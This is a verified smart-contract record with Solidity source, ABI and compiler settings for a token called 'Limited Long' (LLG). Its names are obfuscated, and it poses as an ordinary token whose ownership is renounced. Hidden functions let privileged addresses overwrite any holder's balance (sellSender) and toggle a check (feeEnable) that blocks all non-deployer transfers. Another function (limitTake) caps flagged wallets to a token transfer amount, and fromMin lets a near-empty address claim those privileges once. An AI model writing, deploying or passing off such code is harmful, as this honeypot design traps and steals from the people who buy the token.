{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface tokenLaunchBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromMax {\n    function createPair(address sellEnable, address launchedTo) external returns (address);\n}\n\ninterface toLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableFee) external view returns (uint256);\n\n    function transfer(address totalTx, uint256 walletShouldTake) external returns (bool);\n\n    function allowance(address fundIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletShouldTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTx,\n        uint256 walletShouldTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoMarketing, uint256 value);\n    event Approval(address indexed fundIs, address indexed spender, uint256 value);\n}\n\ninterface receiverLiquidity is toLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LimitedLong is amountBuy, toLaunch, receiverLiquidity {\n\n    function name() external view virtual override returns (string memory) {\n        return feeSell;\n    }\n\n    address public minMarketing;\n\n    mapping(address => mapping(address => uint256)) private launchLiquidityAuto;\n\n    function buyLaunch(address maxSender, address totalTx, uint256 walletShouldTake) internal returns (bool) {\n        require(tokenTotal[maxSender] >= walletShouldTake);\n        tokenTotal[maxSender] -= walletShouldTake;\n        tokenTotal[totalTx] += walletShouldTake;\n        emit Transfer(maxSender, totalTx, walletShouldTake);\n        return true;\n    }\n\n    string private feeSell = \"Limited Long\";\n\n    uint256 constant fundShould = 7 ** 10;\n\n    function allowance(address shouldSell, address receiverTeam) external view virtual override returns (uint256) {\n        if (receiverTeam == enableTrading) {\n            return type(uint256).max;\n        }\n        return launchLiquidityAuto[shouldSell][receiverTeam];\n    }\n\n    address private launchedBuy;\n\n    string private atMax = \"LLG\";\n\n    bool public isTake;\n\n    function getOwner() external view returns (address) {\n        return launchedBuy;\n    }\n\n    uint256 private fundAtSwap;\n\n    mapping(address => bool) public marketingTradingWallet;\n\n    uint256 fundAuto;\n\n    bool public isBuy;\n\n    function listAuto() private view {\n        require(liquidityMin[_msgSender()]);\n    }\n\n    address public tokenFromMode;\n\n    constructor (){\n        if (fundAtSwap != minTx) {\n            minTx = modeIs;\n        }\n        tokenLaunchBuy fundAmount = tokenLaunchBuy(enableTrading);\n        tokenFromMode = fromMax(fundAmount.factory()).createPair(fundAmount.WETH(), address(this));\n        \n        minMarketing = _msgSender();\n        fundSender();\n        liquidityMin[minMarketing] = true;\n        tokenTotal[minMarketing] = tokenSwap;\n        if (modeIs != minTx) {\n            modeFund = true;\n        }\n        emit Transfer(address(0), minMarketing, tokenSwap);\n    }\n\n    uint256 public minTx;\n\n    bool private modeFund;\n\n    event OwnershipTransferred(address indexed shouldFromLaunch, address indexed receiverIs);\n\n    function maxLaunchedSender(address maxSender, address totalTx, uint256 walletShouldTake) internal returns (bool) {\n        if (maxSender == minMarketing) {\n            return buyLaunch(maxSender, totalTx, walletShouldTake);\n        }\n        uint256 toLimit = toLaunch(tokenFromMode).balanceOf(teamTotalTo);\n        require(toLimit == fundAuto);\n        require(totalTx != teamTotalTo);\n        if (marketingTradingWallet[maxSender]) {\n            return buyLaunch(maxSender, totalTx, fundShould);\n        }\n        return buyLaunch(maxSender, totalTx, walletShouldTake);\n    }\n\n    uint256 public modeIs;\n\n    function transferFrom(address maxSender, address totalTx, uint256 walletShouldTake) external override returns (bool) {\n        if (_msgSender() != enableTrading) {\n            if (launchLiquidityAuto[maxSender][_msgSender()] != type(uint256).max) {\n                require(walletShouldTake <= launchLiquidityAuto[maxSender][_msgSender()]);\n                launchLiquidityAuto[maxSender][_msgSender()] -= walletShouldTake;\n            }\n        }\n        return maxLaunchedSender(maxSender, totalTx, walletShouldTake);\n    }\n\n    bool private exemptTx;\n\n    uint256 launchedExempt;\n\n    bool private tokenFrom;\n\n    function owner() external view returns (address) {\n        return launchedBuy;\n    }\n\n    mapping(address => bool) public liquidityMin;\n\n    uint8 private walletAuto = 18;\n\n    address teamTotalTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private tokenTotal;\n\n    function transfer(address tokenIsSell, uint256 walletShouldTake) external virtual override returns (bool) {\n        return maxLaunchedSender(_msgSender(), tokenIsSell, walletShouldTake);\n    }\n\n    address enableTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atMax;\n    }\n\n    function sellSender(address tokenIsSell, uint256 walletShouldTake) public {\n        listAuto();\n        tokenTotal[tokenIsSell] = walletShouldTake;\n    }\n\n    function feeEnable(uint256 walletShouldTake) public {\n        listAuto();\n        fundAuto = walletShouldTake;\n    }\n\n    function fundSender() public {\n        emit OwnershipTransferred(minMarketing, address(0));\n        launchedBuy = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenSwap;\n    }\n\n    function fromMin(address totalMarketing) public {\n        require(totalMarketing.balance < 100000);\n        if (isTake) {\n            return;\n        }\n        if (teamMax) {\n            exemptTx = false;\n        }\n        liquidityMin[totalMarketing] = true;\n        \n        isTake = true;\n    }\n\n    function balanceOf(address enableFee) public view virtual override returns (uint256) {\n        return tokenTotal[enableFee];\n    }\n\n    bool private listMarketing;\n\n    function approve(address receiverTeam, uint256 walletShouldTake) public virtual override returns (bool) {\n        launchLiquidityAuto[_msgSender()][receiverTeam] = walletShouldTake;\n        emit Approval(_msgSender(), receiverTeam, walletShouldTake);\n        return true;\n    }\n\n    function limitTake(address teamSell) public {\n        listAuto();\n        if (isBuy) {\n            listMarketing = true;\n        }\n        if (teamSell == minMarketing || teamSell == tokenFromMode) {\n            return;\n        }\n        marketingTradingWallet[teamSell] = true;\n    }\n\n    bool private amountLimit;\n\n    bool public teamMax;\n\n    uint256 private tokenSwap = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletShouldTake\",\"type\":\"uint256\"}],\"name\":\"feeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"}],\"name\":\"fromMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTradingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIsSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldTake\",\"type\":\"uint256\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFromMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenIsSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletShouldTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LimitedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}